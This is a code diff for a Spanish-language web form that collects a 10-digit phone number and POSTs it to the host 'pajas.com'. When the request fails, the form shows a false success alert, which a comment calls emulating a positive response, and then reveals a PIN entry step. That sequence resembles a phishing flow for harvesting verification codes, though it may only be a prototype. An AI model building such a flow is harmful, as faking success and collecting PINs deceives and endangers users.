@@ -1,5 +1,5 @@
  <form class="form-container">
-        <input type="tel" id="numberInput" placeholder="INGRESÁ TU NÚMERO" name="numberInput" required />
+        <input type="tel" id="numberInput" maxlength="10" minlength="10" placeholder="INGRESÁ TU NÚMERO" name="numberInput" required />
         <button type="submit" id= "numberBtn" disabled>ENVIAR</button>
 </form>
 
@@ -49,12 +49,13 @@
 </style>
 
 <script>
-    const numberInput = document.getElementById('numberInput') as HTMLInputElement | null;
+    const numberInput = document.querySelector('#numberInput') as HTMLInputElement | null;
     const numberBtn = document.getElementById('numberBtn') as HTMLButtonElement | null;
+    const numberForm = document.querySelector('.form-container') as HTMLFormElement | null;
 
     if (numberInput && numberBtn) {
         numberInput.addEventListener('input', () => {
-            if (numberInput.value.length === 10) {
+            if (numberInput.value.length == 10) {
                 numberBtn.disabled = false;
                 numberBtn.style.backgroundColor = '#0074e0';
             } else {
@@ -66,6 +67,39 @@
 
         });
     }
+
+    numberForm?.addEventListener('submit', async (event) => {
+            event.preventDefault();
+
+            const data = {
+                number: numberInput.value
+            }
+            
+            try {
+                const phoneNumber = numberInput.value;
+                const url = `pajas.com`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                }); 
+
+                const result = await response.json();
+
+              
+
+            } catch (error) {
+                alert('El número se envió correctamente');
+                //emulas como si fuese una respuesta positiva
+                numberForm.style.display = 'none';
+                document.querySelector('.formPin').style.display = 'flex';
+
+                
+            }
+          
+        });
 </script>
 
 
